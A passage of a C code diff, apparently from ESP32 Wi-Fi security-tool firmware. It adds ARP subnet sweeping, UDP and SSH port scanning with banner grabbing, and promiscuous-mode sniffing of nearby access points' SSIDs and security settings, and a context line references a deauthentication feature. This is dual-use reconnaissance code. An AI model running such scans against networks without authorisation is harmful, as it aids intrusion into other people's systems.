+            ESP_LOGD(TAG, "ARP packet sent successfully to %s", target_ip);
+            return true;
+        } else if (err == ESP_ERR_NO_MEM) {
+            // WiFi buffer exhaustion - wait and retry
+            retry_count++;
+            ESP_LOGD(TAG, "WiFi buffer full for %s, retry %d/%d", target_ip, retry_count, max_retries);
+            vTaskDelay(pdMS_TO_TICKS(10)); // Wait 10ms before retry
+        } else {
+            // Other error - don't retry
+            ESP_LOGW(TAG, "Failed to send ARP packet to %s: %s", target_ip, esp_err_to_name(err));
+            break;
+        }
+    }
+    
+    if (err == ESP_ERR_NO_MEM) {
+        ESP_LOGW(TAG, "Failed to send ARP packet to %s after %d retries: WiFi buffers exhausted", target_ip, max_retries);
+    }
+    
+    return false;
+}
+
+// Alternative ARP resolution using ICMP ping to trigger ARP
+bool trigger_arp_via_ping(const char *ip) {
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = inet_addr(ip);
+    
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) {
+        // Try UDP socket as fallback
+        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (sock < 0) {
+            return false;
+        }
+        dest_addr.sin_port = htons(53); // DNS port
+        
+        // Set non-blocking and short timeout
+        int flags = fcntl(sock, F_GETFL, 0);
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+        
+        // Try to connect to trigger ARP resolution
+        connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        close(sock);
+        return true;
+    }
+    
+    close(sock);
+    return true;
+}
+
+bool send_arp_request_lwip(const char *target_ip) {
+    if (!target_ip) {
+        return false;
+    }
+
+    // Parse target IP
+    ip4_addr_t target_addr;
+    if (!ip4addr_aton(target_ip, &target_addr)) {
+        return false;
+    }
+
+    // Get STA network interface
+    struct netif *netif = netif_default;
+    if (!netif) {
+        ESP_LOGW(TAG, "netif_default is NULL");
+        return false;
+    }
+
+    // Send ARP request using lwIP
+    err_t result = etharp_request(netif, &target_addr);
+    return (result == ERR_OK);
+}
+
+bool get_arp_table_entry(const char *ip, uint8_t *mac) {
+    if (!ip || !mac) {
+        return false;
+    }
+
+    // Parse target IP
+    ip4_addr_t target_addr;
+    if (!ip4addr_aton(ip, &target_addr)) {
+        return false;
+    }
+
+    // Search ARP table using NULL netif (searches all interfaces)
+    struct eth_addr *eth_ret = NULL;
+    const ip4_addr_t *ip_ret = NULL;
+    
+    s8_t arp_idx = etharp_find_addr(NULL, &target_addr, &eth_ret, &ip_ret);
+    if (arp_idx >= 0 && eth_ret) {
+        memcpy(mac, eth_ret->addr, 6);
+        return true;
+    }
+
+    return false;
+}
+
+bool wifi_manager_arp_scan_subnet(void) {
+    arp_scanner_ctx_t *ctx = arp_scanner_init();
+    if (!ctx) {
+        TERMINAL_VIEW_ADD_TEXT("Failed to initialize ARP scanner context\n");
+        return false;
+    }
+
+    // Get subnet information using existing function
+    scanner_ctx_t temp_ctx;
+    if (!get_subnet_prefix(&temp_ctx)) {
+        TERMINAL_VIEW_ADD_TEXT("Failed to get network information. Make sure WiFi is connected.\n");
+        arp_scanner_cleanup(ctx);
+        return false;
+    }
+
+    strncpy(ctx->subnet_prefix, temp_ctx.subnet_prefix, sizeof(ctx->subnet_prefix) - 1);
+
+    char scan_msg[64];
+    snprintf(scan_msg, sizeof(scan_msg), "Starting ARP scan on %s0/24\n", ctx->subnet_prefix);
+    TERMINAL_VIEW_ADD_TEXT(scan_msg);
+
+    TERMINAL_VIEW_ADD_TEXT("Scanning network using ARP requests...\n");
+    printf("Starting ARP scan on %s1-%d\n", ctx->subnet_prefix, END_HOST);
+    ESP_LOGI(TAG, "Starting ARP scan, scanning %s1-%d", ctx->subnet_prefix, END_HOST);
+    
+    ctx->num_active_hosts = 0;
+    const int batch_size = 10;
+    
+    for (int batch_start = START_HOST; batch_start <= END_HOST; batch_start += batch_size) {
+        int batch_end = (batch_start + batch_size - 1 > END_HOST) ? END_HOST : batch_start + batch_size - 1;
+        
+        // Progress update
+        char progress_msg[64];
+        snprintf(progress_msg, sizeof(progress_msg), "Scanning %s%d-%d...\n", ctx->subnet_prefix, batch_start, batch_end);
+        TERMINAL_VIEW_ADD_TEXT(progress_msg);
+        printf("Scanning %s%d-%d...\n", ctx->subnet_prefix, batch_start, batch_end);
+        
+        ESP_LOGI(TAG, "Sending ARP batch %d-%d", batch_start, batch_end);
+        
+        // Send batch of ARP requests using lwIP
+        for (int host = batch_start; host <= batch_end; host++) {
+            char current_ip[26];
+            snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
+            
+            send_arp_request_lwip(current_ip);
+            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between requests
+        }
+        
+        // Wait for responses to arrive
+        vTaskDelay(pdMS_TO_TICKS(250));
+        
+        // Check ARP table for this batch
+        for (int host = batch_start; host <= batch_end; host++) {
+            char current_ip[26];
+            snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
+            
+            uint8_t mac[6];
+            if (get_arp_table_entry(current_ip, mac)) {
+                if (ctx->num_active_hosts < ctx->max_hosts) {
+                    strncpy(ctx->hosts[ctx->num_active_hosts].ip, current_ip, sizeof(ctx->hosts[ctx->num_active_hosts].ip) - 1);
+                    memcpy(ctx->hosts[ctx->num_active_hosts].mac, mac, 6);
+                    ctx->hosts[ctx->num_active_hosts].is_active = true;
+                    ctx->num_active_hosts++;
+
+
+                }
+            }
+        }
+        
+        // Progress update every 5 batches or at end
+        if ((batch_end - START_HOST + 1) % 50 == 0 || batch_end == END_HOST) {
+            char status_msg[64];
+            snprintf(status_msg, sizeof(status_msg), "Progress: %d/%d scanned, %zu hosts found\n", 
+                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
+            TERMINAL_VIEW_ADD_TEXT(status_msg);
+            printf("Progress: %d/%d scanned, %zu hosts found\n", 
+                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
+            ESP_LOGI(TAG, "Progress: %d/%d, found %zu hosts so far", 
+                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
+        }
+    }
+
+    // Final summary
+    TERMINAL_VIEW_ADD_TEXT("\n=== ARP Scan Results ===\n");
+    printf("\n=== ARP Scan Results ===\n");
+    
+    char result_msg[64];
+    snprintf(result_msg, sizeof(result_msg), "Found %zu active hosts on %s0/24:\n", ctx->num_active_hosts, ctx->subnet_prefix);
+    TERMINAL_VIEW_ADD_TEXT(result_msg);
+    printf("Found %zu active hosts on %s0/24:\n", ctx->num_active_hosts, ctx->subnet_prefix);
+    
+    if (ctx->num_active_hosts > 0) {
+        TERMINAL_VIEW_ADD_TEXT("\nActive hosts:\n");
+        printf("\nActive hosts:\n");
+        
+        for (size_t i = 0; i < ctx->num_active_hosts; i++) {
+            char host_entry[80];
+            snprintf(host_entry, sizeof(host_entry), "%2zu. %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    i + 1,
+                    ctx->hosts[i].ip,
+                    ctx->hosts[i].mac[0], ctx->hosts[i].mac[1], ctx->hosts[i].mac[2],
+                    ctx->hosts[i].mac[3], ctx->hosts[i].mac[4], ctx->hosts[i].mac[5]);
+            TERMINAL_VIEW_ADD_TEXT(host_entry);
+            printf("%2zu. %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                    i + 1,
+                    ctx->hosts[i].ip,
+                    ctx->hosts[i].mac[0], ctx->hosts[i].mac[1], ctx->hosts[i].mac[2],
+                    ctx->hosts[i].mac[3], ctx->hosts[i].mac[4], ctx->hosts[i].mac[5]);
+        }
+    } else {
+        TERMINAL_VIEW_ADD_TEXT("No active hosts found.\n");
+        printf("No active hosts found.\n");
+    }
+    
+    TERMINAL_VIEW_ADD_TEXT("\nARP scan completed.\n");
+    printf("\nARP scan completed.\n");
+    ESP_LOGI(TAG, "ARP scan completed. Found %zu active hosts", ctx->num_active_hosts);
+
+    arp_scanner_cleanup(ctx);
+    return true;
+}
+
 void scan_ports_on_host(const char *target_ip, host_result_t *result) {
     struct sockaddr_in server_addr;
     int sock;
@@ -2332,6 +2901,281 @@ void scan_ports_on_host(const char *target_ip, host_result_t *result) {
     }
 }
 
+static size_t build_udp_probe(uint16_t port, uint8_t *buf, size_t bufsize) {
+    if (port == 53 && bufsize >= 64) {
+        uint8_t *p = buf;
+        uint16_t id = (uint16_t)esp_random();
+        *(uint16_t *)(p + 0) = htons(id);
+        *(uint16_t *)(p + 2) = htons(0x0100);
+        *(uint16_t *)(p + 4) = htons(1);
+        *(uint16_t *)(p + 6) = 0;
+        *(uint16_t *)(p + 8) = 0;
+        *(uint16_t *)(p + 10) = 0;
+        p += 12;
+        const char *name = "example.com";
+        const char *dot = name;
+        while (*dot) {
+            const char *start = dot;
+            while (*dot && *dot != '.') dot++;
+            size_t len = (size_t)(dot - start);
+            *p++ = (uint8_t)len;
+            memcpy(p, start, len);
+            p += len;
+            if (*dot == '.') dot++;
+        }
+        *p++ = 0;
+        *(uint16_t *)p = htons(1);
+        p += 2;
+        *(uint16_t *)p = htons(1);
+        p += 2;
+        return (size_t)(p - buf);
+    }
+    if (port == 123 && bufsize >= 48) {
+        memset(buf, 0, 48);
+        buf[0] = 0x1b;
+        return 48;
+    }
+    if (port == 69 && bufsize >= 64) {
+        uint8_t *p = buf;
+        *(uint16_t *)p = htons(1);
+        p += 2;
+        const char *fname = "test";
+        memcpy(p, fname, strlen(fname));
+        p += strlen(fname);
+        *p++ = 0;
+        const char *mode = "octet";
+        memcpy(p, mode, strlen(mode));
+        p += strlen(mode);
+        *p++ = 0;
+        return (size_t)(p - buf);
+    }
+    if (port == 1900 && bufsize >= 256) {
+        const char *msearch = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n";
+        size_t len = strlen(msearch);
+        memcpy(buf, msearch, len);
+        return len;
+    }
+    if (bufsize >= 1) {
+        buf[0] = 0x00;
+        return 1;
+    }
+    return 0;
+}
+
+static bool udp_port_is_open(const char *target_ip, uint16_t port, uint32_t wait_ms) {
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) return false;
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, target_ip, &addr.sin_addr.s_addr);
+
+    struct timeval tv;
+    tv.tv_sec = wait_ms / 1000;
+    tv.tv_usec = (wait_ms % 1000) * 1000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    uint8_t probe[256];
+    size_t probe_len = build_udp_probe(port, probe, sizeof(probe));
+    if (probe_len == 0) {
+        close(sock);
+        return false;
+    }
+    sendto(sock, probe, probe_len, 0, (struct sockaddr *)&addr, sizeof(addr));
+
+    uint8_t buf[512];
+    struct sockaddr_in from;
+    socklen_t fromlen = sizeof(from);
+    int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen);
+    if (n > 0) {
+        close(sock);
+        return true;
+    }
+    int err = errno;
+    close(sock);
+    if (err == ECONNREFUSED) return false;
+    return false;
+}
+
+void scan_udp_ports_on_host(const char *target_ip, host_result_t *result) {
+    strcpy(result->ip, target_ip);
+    result->num_open_ports = 0;
+
+    printf("Scanning UDP host: %s\n", target_ip);
+    TERMINAL_VIEW_ADD_TEXT("Scanning UDP host: %s\n", target_ip);
+
+    for (size_t i = 0; i < NUM_UDP_PORTS; i++) {
+        if (result->num_open_ports >= MAX_OPEN_PORTS) break;
+        uint16_t port = UDP_COMMON_PORTS[i];
+        if (udp_port_is_open(target_ip, port, 40)) {
+            result->open_ports[result->num_open_ports++] = port;
+            printf("%s - UDP %d responded\n", target_ip, port);
+            TERMINAL_VIEW_ADD_TEXT("%s - UDP %d responded\n", target_ip, port);
+        }
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+}
+
+bool scan_ip_udp_port_range(const char *target_ip, uint16_t start_port, uint16_t end_port) {
+    scanner_ctx_t *ctx = scanner_init();
+    if (!ctx) {
+        printf("Failed to initialize scanner context\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to initialize scanner context\n");
+        return false;
+    }
+
+    ctx->num_active_hosts = 1;
+    host_result_t *result = &ctx->results[0];
+    strcpy(result->ip, target_ip);
+    result->num_open_ports = 0;
+
+    printf("Scanning %s UDP ports %d-%d\n", target_ip, start_port, end_port);
+    TERMINAL_VIEW_ADD_TEXT("Scanning %s UDP ports %d-%d\n", target_ip, start_port, end_port);
+
+    uint16_t ports_scanned = 0;
+    uint16_t total_ports = end_port - start_port + 1;
+
+    for (uint16_t port = start_port; port <= end_port; port++) {
+        if (result->num_open_ports >= MAX_OPEN_PORTS) break;
+        ports_scanned++;
+        if (ports_scanned % 200 == 0) {
+            printf("UDP Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned, total_ports,
+                   (float)ports_scanned / total_ports * 100);
+            TERMINAL_VIEW_ADD_TEXT("UDP Progress: %d/%d ports scanned (%.1f%%)\n", ports_scanned,
+                                   total_ports, (float)ports_scanned / total_ports * 100);
+        }
+        if (udp_port_is_open(target_ip, port, 40)) {
+            result->open_ports[result->num_open_ports++] = port;
+            printf("%s - UDP %d responded\n", target_ip, port);
+            TERMINAL_VIEW_ADD_TEXT("%s - UDP %d responded\n", target_ip, port);
+        }
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+
+    for (size_t i = 0; i < ctx->num_active_hosts; i++) {
+        if (ctx->results[i].num_open_ports > 0) {
+            printf("Host %s has %d udp ports responding\n", ctx->results[i].ip,
+                   ctx->results[i].num_open_ports);
+            TERMINAL_VIEW_ADD_TEXT("Host %s has %d udp ports responding\n", ctx->results[i].ip,
+                                   ctx->results[i].num_open_ports);
+        }
+    }
+
+    scanner_cleanup(ctx);
+    return true;
+}
+
+void scan_ssh_on_host(const char *target_ip, host_result_t *result) {
+    struct sockaddr_in server_addr;
+    int sock;
+    int scan_result;
+    struct timeval timeout;
+    fd_set fdset;
+    int flags;
+    char banner[256];
+    ssize_t bytes_read;
+    
+    ESP_LOGI("SSH_SCAN", "Starting SSH scan on host: %s", target_ip);
+    
+    strcpy(result->ip, target_ip);
+    result->num_open_ports = 0;
+    
+    server_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, target_ip, &server_addr.sin_addr.s_addr);
+    
+    printf("SSH scanning host: %s\n", target_ip);
+    TERMINAL_VIEW_ADD_TEXT("SSH scanning host: %s\n", target_ip);
+    
+    uint16_t ssh_ports[] = {22, 2222, 2022};
+    size_t num_ssh_ports = sizeof(ssh_ports) / sizeof(ssh_ports[0]);
+    
+    for (size_t i = 0; i < num_ssh_ports; i++) {
+        if (result->num_open_ports >= MAX_OPEN_PORTS)
+            break;
+            
+        uint16_t port = ssh_ports[i];
+        ESP_LOGI("SSH_SCAN", "Testing port %d on %s", port, target_ip);
+        printf("Testing SSH port %d on %s...", port, target_ip);
+        TERMINAL_VIEW_ADD_TEXT("Testing SSH port %d on %s...", port, target_ip);
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock < 0) {
+            ESP_LOGE("SSH_SCAN", "Failed to create socket for port %d: errno=%d", port, errno);
+            continue;
+        }
+            
+        flags = fcntl(sock, F_GETFL, 0);
+        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+        
+        server_addr.sin_port = htons(port);
+        ESP_LOGD("SSH_SCAN", "Attempting connection to %s:%d", target_ip, port);
+        scan_result = connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        
+        if (scan_result < 0 && errno == EINPROGRESS) {
+            timeout.tv_sec = 3;
+            timeout.tv_usec = 0;
+            
+            FD_ZERO(&fdset);
+            FD_SET(sock, &fdset);
+            
+            scan_result = select(sock + 1, NULL, &fdset, NULL, &timeout);
+            
+            if (scan_result > 0) {
+                int error = 0;
+                socklen_t len = sizeof(error);
+                if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) >= 0 && error == 0) {
+                    ESP_LOGI("SSH_SCAN", "Port %d is OPEN on %s", port, target_ip);
+                    result->open_ports[result->num_open_ports++] = port;
+                    
+                    fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);
+                    
+                    timeout.tv_sec = 2;
+                    timeout.tv_usec = 0;
+                    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+                    
+                    memset(banner, 0, sizeof(banner));
+                    bytes_read = recv(sock, banner, sizeof(banner) - 1, 0);
+                    ESP_LOGD("SSH_SCAN", "Received %d bytes from %s:%d", (int)bytes_read, target_ip, port);
+                    
+                    if (bytes_read > 0) {
+                        banner[bytes_read] = '\0';
+                        char *newline = strchr(banner, '\r');
+                        if (newline) *newline = '\0';
+                        newline = strchr(banner, '\n');
+                        if (newline) *newline = '\0';
+                        
+                        ESP_LOGI("SSH_SCAN", "SSH banner from %s:%d: %s", target_ip, port, banner);
+                        printf(" OPEN: %s\n", banner);
+                        TERMINAL_VIEW_ADD_TEXT(" OPEN: %s\n", banner);
+                    } else {
+                        printf(" OPEN (no banner)\n");
+                        TERMINAL_VIEW_ADD_TEXT(" OPEN (no banner)\n");
+                    }
+                } else {
+                    ESP_LOGD("SSH_SCAN", "Port %d connection failed on %s (getsockopt error)", port, target_ip);
+                    printf(" CLOSED\n");
+                    TERMINAL_VIEW_ADD_TEXT(" CLOSED\n");
+                }
+            } else {
+                ESP_LOGD("SSH_SCAN", "Port %d timeout on %s (select result: %d)", port, target_ip, scan_result);
+                printf(" TIMEOUT\n");
+                TERMINAL_VIEW_ADD_TEXT(" TIMEOUT\n");
+            }
+        } else {
+            ESP_LOGD("SSH_SCAN", "Port %d immediate connection failure on %s (errno: %d)", port, target_ip, errno);
+            printf(" CLOSED\n");
+            TERMINAL_VIEW_ADD_TEXT(" CLOSED\n");
+        }
+        
+        close(sock);
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+    
+    printf("SSH scan completed on %s - found %d open ports\n", target_ip, result->num_open_ports);
+    TERMINAL_VIEW_ADD_TEXT("SSH scan completed on %s - found %d open ports\n", target_ip, result->num_open_ports);
+}
+
 void scanner_cleanup(scanner_ctx_t *ctx) {
     if (ctx) {
         if (ctx->results) {
@@ -2368,7 +3212,29 @@ bool wifi_manager_scan_subnet() {
         if (is_host_active(current_ip)) {
             printf("Found active host: %s\n", current_ip);
             TERMINAL_VIEW_ADD_TEXT("Found active host: %s\n", current_ip);
-            scan_ports_on_host(current_ip, &ctx->results[ctx->num_active_hosts]);
+
+            host_result_t tcp_result;
+            host_result_t udp_result;
+
+            scan_ports_on_host(current_ip, &tcp_result);
+            scan_udp_ports_on_host(current_ip, &udp_result);
+
+            ctx->results[ctx->num_active_hosts] = tcp_result;
+
+            if (udp_result.num_open_ports > 0) {
+                printf("UDP ports responding on %s:\n", current_ip);
+                TERMINAL_VIEW_ADD_TEXT("UDP ports responding on %s:\n", current_ip);
+                for (uint8_t k = 0; k < udp_result.num_open_ports; k++) {
+                    char line[32];
+                    snprintf(line, sizeof(line), "  UDP %d\n", udp_result.open_ports[k]);
+                    printf("%s", line);
+                    TERMINAL_VIEW_ADD_TEXT(line);
+                }
+            } else {
+                printf("No UDP responses on %s\n", current_ip);
+                TERMINAL_VIEW_ADD_TEXT("No UDP responses on %s\n", current_ip);
+            }
+
             ctx->num_active_hosts++;
         }
     }
@@ -2742,7 +3608,80 @@ void wifi_manager_stop_deauth() {
     }
 }
 
-// Print the scan results and match BSSID to known companies
+static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_record_t *rec, bool include_security) {
+    char sanitized_ssid[33];
+    sanitize_ssid_and_check_hidden((uint8_t *)rec->ssid, sanitized_ssid, sizeof(sanitized_ssid));
+
+    ECompany company = match_bssid_to_company(rec->bssid);
+    const char *company_str = "Unknown";
+    switch (company) {
+        case COMPANY_DLINK: company_str = "DLink"; break;
+        case COMPANY_NETGEAR: company_str = "Netgear"; break;
+        case COMPANY_BELKIN: company_str = "Belkin"; break;
+        case COMPANY_TPLINK: company_str = "TPLink"; break;
+        case COMPANY_LINKSYS: company_str = "Linksys"; break;
+        case COMPANY_ASUS: company_str = "ASUS"; break;
+        case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
+        default: company_str = "Unknown"; break;
+    }
+
+    printf("[%u] SSID: %s,\n"
+           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
+           "     RSSI: %d,\n"
+           "     Channel: %d,\n",
+           idx,
+           sanitized_ssid,
+           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
+           rec->rssi,
+           rec->primary);
+    TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
+                           "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
+                           "     RSSI: %d,\n"
+                           "     Channel: %d,\n",
+                           idx,
+                           sanitized_ssid,
+                           rec->bssid[0], rec->bssid[1], rec->bssid[2], rec->bssid[3], rec->bssid[4], rec->bssid[5],
+                           rec->rssi,
+                           rec->primary);
+
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+    if (include_security) {
+        int ch = rec->primary;
+        const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
+        printf("     Band: %s,\n", band_str);
+        TERMINAL_VIEW_ADD_TEXT("     Band: %s,\n", band_str);
+
+        const char *auth_str = "Unknown";
+        const char *pmf_str = NULL;
+        switch (rec->authmode) {
+            case WIFI_AUTH_OPEN: auth_str = "Open"; break;
+            case WIFI_AUTH_WEP: auth_str = "WEP"; break;
+            case WIFI_AUTH_WPA_PSK: auth_str = "WPA"; break;
+            case WIFI_AUTH_WPA2_PSK: auth_str = "WPA2"; break;
+            case WIFI_AUTH_WPA_WPA2_PSK: auth_str = "WPA/WPA2"; break;
+            case WIFI_AUTH_WPA2_ENTERPRISE: auth_str = "WPA2-Enterprise"; break;
+            case WIFI_AUTH_WPA3_PSK: auth_str = "WPA3"; pmf_str = "Required"; break;
+            case WIFI_AUTH_WPA2_WPA3_PSK: auth_str = "WPA2/WPA3"; pmf_str = "Required (WPA3)"; break;
+            case WIFI_AUTH_WAPI_PSK: auth_str = "WAPI"; break;
+            case WIFI_AUTH_WPA3_ENTERPRISE: auth_str = "WPA3-Enterprise"; pmf_str = "Required"; break;
+            default: auth_str = "Unknown"; break;
+        }
+        if (pmf_str) {
+            printf("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
+            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
+        } else {
+            printf("     Security: %s\n", auth_str);
+            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n", auth_str);
+        }
+    }
+#endif
+
+    if (strcmp(company_str, "Unknown") != 0) {
+        printf("     Company: %s\n", company_str);
+        TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
+    }
+}
+
 void wifi_manager_print_scan_results_with_oui() {
     if (scanned_aps == NULL) {
         printf("AP information not available\n");
@@ -2750,7 +3689,12 @@ void wifi_manager_print_scan_results_with_oui() {
         return;
     }
 
-    for (uint16_t i = 0; i < ap_count; i++) {
+    uint16_t limit = ap_count;
+    if (limit > 50) {
+        limit = 50;
+    }
+
+    for (uint16_t i = 0; i < limit; i++) {
         char sanitized_ssid[33];
         sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
 
@@ -2927,6 +3871,188 @@ void wifi_manager_print_scan_results_with_oui() {
             TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
         }
     }
+}
+
+static void live_ap_channel_hop_timer_callback(void *arg) {
+    if (!live_ap_hopping_active) return;
+    live_ap_channel_index = (live_ap_channel_index + 1) % live_ap_channels_len;
+    esp_wifi_set_channel(live_ap_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
+}
+
+static esp_err_t start_live_ap_channel_hopping(void) {
+    if (live_ap_channel_hop_timer != NULL) {
+        esp_timer_stop(live_ap_channel_hop_timer);
+        esp_timer_delete(live_ap_channel_hop_timer);
+        live_ap_channel_hop_timer = NULL;
+    }
+    live_ap_channel_index = 0;
+    esp_wifi_set_channel(live_ap_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
+    esp_timer_create_args_t timer_args = {
+        .callback = live_ap_channel_hop_timer_callback,
+        .name = "live_ap_hop"
+    };
+    esp_err_t err = esp_timer_create(&timer_args, &live_ap_channel_hop_timer);
+    if (err != ESP_OK) return err;
+    err = esp_timer_start_periodic(live_ap_channel_hop_timer, SCANSTA_CHANNEL_HOP_INTERVAL_MS * 1000);
+    if (err != ESP_OK) {
+        esp_timer_delete(live_ap_channel_hop_timer);
+        live_ap_channel_hop_timer = NULL;
+        return err;
+    }
+    live_ap_hopping_active = true;
+    return ESP_OK;
+}
+
+static void stop_live_ap_channel_hopping(void) {
+    if (live_ap_channel_hop_timer) {
+        esp_timer_stop(live_ap_channel_hop_timer);
+        esp_timer_delete(live_ap_channel_hop_timer);
+        live_ap_channel_hop_timer = NULL;
+    }
+    live_ap_hopping_active = false;
+}
+
+static bool bssid_already_listed(const uint8_t *bssid) {
+    for (int i = 0; i < ap_count; i++) {
+        if (memcmp(scanned_aps[i].bssid, bssid, 6) == 0) return true;
+    }
+    return false;
+}
+
+static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    if (pkt->rx_ctrl.sig_len < 36) return;
+    const uint8_t *payload = pkt->payload;
+    uint8_t frame_subtype = (payload[0] & 0xF0) >> 4;
+    if (frame_subtype != 0x08 && frame_subtype != 0x05) return;
+
+    const wifi_ieee80211_packet_t *ipkt = (const wifi_ieee80211_packet_t *)payload;
+    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
+    const uint8_t *bssid = hdr->addr3;
+
+    if (bssid_already_listed(bssid)) return;
+
+    int idx = 36;
+    char ssid[33] = {0};
+    while (idx + 1 < pkt->rx_ctrl.sig_len) {
+        uint8_t id = payload[idx];
+        uint8_t ie_len = payload[idx + 1];
+        if (idx + 2 + ie_len > pkt->rx_ctrl.sig_len) break;
+        if (id == 0 && ie_len <= 32) {
+            memcpy(ssid, &payload[idx + 2], ie_len);
+            ssid[ie_len] = '\0';
+            break;
+        }
+        idx += 2 + ie_len;
+    }
+
+    if (ssid[0] == '\0') {
+        strncpy(ssid, "<hidden>", sizeof(ssid));
+    }
+
+    char sanitized[33];
+    sanitize_ssid_and_check_hidden((uint8_t *)ssid, sanitized, sizeof(sanitized));
+
+    // derive security from IEs
+    bool has_wpa = false;
+    bool has_wpa2 = false;
+    bool has_wpa3 = false;
+    // capability info privacy bit for WEP detection
+    if (pkt->rx_ctrl.sig_len >= 36) {
+        uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
+        // iterate IEs to find RSN/WPA
+        int ie = 36;
+        while (ie + 1 < pkt->rx_ctrl.sig_len) {
+            uint8_t eid = payload[ie];
+            uint8_t elen = payload[ie + 1];
+            if (ie + 2 + elen > pkt->rx_ctrl.sig_len) break;
+            if (eid == 48 /* RSN */ && elen >= 2) {
+                int off = ie + 2;
+                if (off + 2 <= ie + 2 + elen) {
+                    off += 2; // version
+                }
+                if (off + 4 <= ie + 2 + elen) {
+                    off += 4; // group cipher suite
+                }
+                if (off + 2 <= ie + 2 + elen) {
+                    uint16_t pairwise_count = payload[off] | (payload[off + 1] << 8);
+                    off += 2 + 4 * pairwise_count;
+                }
+                if (off + 2 <= ie + 2 + elen) {
+                    uint16_t akm_count = payload[off] | (payload[off + 1] << 8);
+                    off += 2;
+                    for (uint16_t a = 0; a < akm_count; a++) {
+                        if (off + 4 > ie + 2 + elen) break;
+                        // OUI 00:0F:AC
+                        uint8_t oui0 = payload[off + 0];
+                        uint8_t oui1 = payload[off + 1];
+                        uint8_t oui2 = payload[off + 2];
+                        uint8_t type = payload[off + 3];
+                        if (oui0 == 0x00 && oui1 == 0x0F && oui2 == 0xAC) {
+                            if (type == 2) has_wpa2 = true;      // PSK
+                            if (type == 8) has_wpa3 = true;      // SAE
+                        }
+                        off += 4;
+                    }
+                }
+            } else if (eid == 221 /* Vendor */ && elen >= 4) {
+                // WPA (00:50:F2, type 1)
+                if (payload[ie + 2] == 0x00 && payload[ie + 3] == 0x50 && payload[ie + 4] == 0xF2 && payload[ie + 5] == 0x01) {
+                    has_wpa = true;
+                }
+            }
+            ie += 2 + elen;
+        }
+    }
+
+    if (scanned_aps == NULL) {
+        scanned_aps = calloc(MAX_SCANNED_APS, sizeof(wifi_ap_record_t));
+        ap_count = 0;
+    }
+    if (scanned_aps && ap_count < MAX_SCANNED_APS) {
+        wifi_ap_record_t *rec = &scanned_aps[ap_count++];
+        memset(rec, 0, sizeof(*rec));
+        memcpy(rec->bssid, bssid, 6);
+        strncpy((char *)rec->ssid, sanitized, sizeof(rec->ssid));
+        rec->rssi = pkt->rx_ctrl.rssi;
+        rec->primary = pkt->rx_ctrl.channel;
+        // map to closest auth mode
+        if (has_wpa3 && has_wpa2) rec->authmode = WIFI_AUTH_WPA2_WPA3_PSK;
+        else if (has_wpa3) rec->authmode = WIFI_AUTH_WPA3_PSK;
+        else if (has_wpa2) rec->authmode = WIFI_AUTH_WPA2_PSK;
+        else if (has_wpa) rec->authmode = WIFI_AUTH_WPA_PSK;
+        else {
